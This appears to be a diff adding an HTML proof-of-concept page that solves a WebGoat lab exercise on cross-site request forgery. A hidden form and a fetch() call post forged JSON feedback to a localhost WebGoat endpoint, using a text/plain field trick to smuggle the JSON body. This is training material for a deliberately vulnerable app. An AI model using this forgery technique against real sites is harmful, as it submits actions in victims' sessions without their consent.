@@ -1,0 +1,33 @@
+<html>
+
+<body>
+
+    <h1>JQuery CSRF Request </h1>
+
+
+    <form action=http://localhost:8080/WebGoat/csrf/feedback/message method=post enctype="text/plain">
+        <input
+            name=' {"name": "WebGoat", "email": " webgoat@webgoat.org ", "content": "WebGoat en iyisidir!!", "ignore_me":" '
+            value='test"}' type='hidden'>
+        <input type='submit' value='Submit'>
+
+    </form>
+
+    <button onclick="sendAjaxRequest()">Send Ajax</button>
+
+    <script>
+
+        function sendAjaxRequest() {
+            fetch(" http://localhost:8000/WebGoat/csrf/feedback/message ", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: "{'name': 'WebGoat', 'email': ' webgoat@webgoat.org ', 'content': 'WebGoat en iyisidir!!'}"
+            });
+        }
+
+
+    </script>
+
+</html>
